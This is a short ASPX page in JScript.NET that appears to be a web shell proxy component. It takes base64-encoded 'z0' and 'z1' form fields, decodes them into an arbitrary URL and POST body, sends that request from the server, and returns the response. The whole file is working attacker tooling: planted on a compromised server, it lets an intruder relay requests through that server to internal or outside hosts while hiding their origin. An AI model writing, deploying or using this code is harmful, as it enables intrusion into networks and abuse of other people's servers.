<%

function base64Decode(str) {
    if (!str || str.Trim() == "") return "";
    try {
        var bytes = System.Convert.FromBase64String(str);
        return System.Text.Encoding.UTF8.GetString(bytes);
    } catch(e) { return ""; }
}

function httpSend(url, method, postData, httpCodeRef) {
    try {
        var request = System.Net.HttpWebRequest(System.Net.WebRequest.Create(url));
        request.Method = method;
        request.UserAgent = "JScript_ASPX";
        request.Timeout = 15000;
        if (method.ToUpper() == "POST" && postData) {
            var byteData = System.Text.Encoding.UTF8.GetBytes(postData);
            
            request.ContentType = "application/x-www-form-urlencoded";
            
            request.ContentLength = byteData.Length;
            var dataStream = request.GetRequestStream();
            dataStream.Write(byteData, 0, byteData.Length);
            dataStream.Close();
        }
        var response = System.Net.HttpWebResponse(request.GetResponse());
        httpCodeRef.Value = System.Convert.ToInt32(response.StatusCode);
        var reader = new System.IO.StreamReader(response.GetResponseStream(), System.Text.Encoding.UTF8);
        var resText = reader.ReadToEnd();
        reader.Close(); response.Close();
        return resText;
    } catch(e : System.Net.WebException) {
        if (e.Response != null) {
            var errRes = System.Net.HttpWebResponse(e.Response);
            httpCodeRef.Value = System.Convert.ToInt32(errRes.StatusCode);
            var errReader = new System.IO.StreamReader(errRes.GetResponseStream(), System.Text.Encoding.UTF8);
            var errText = errReader.ReadToEnd();
            errReader.Close(); errRes.Close();
            return errText;
        }
        httpCodeRef.Value = 0; return "";
    } catch(e) { httpCodeRef.Value = 0; return ""; }
}

Response.ContentType = "text/plain";

var z0 = Request.Form["z0"];
var z1 = Request.Form["z1"];

var url = base64Decode(z0);
var data = base64Decode(z1);

var httpCodeRef = { Value: 0 };

var body = httpSend(url, "POST", data, httpCodeRef);
Response.Write(body);
%>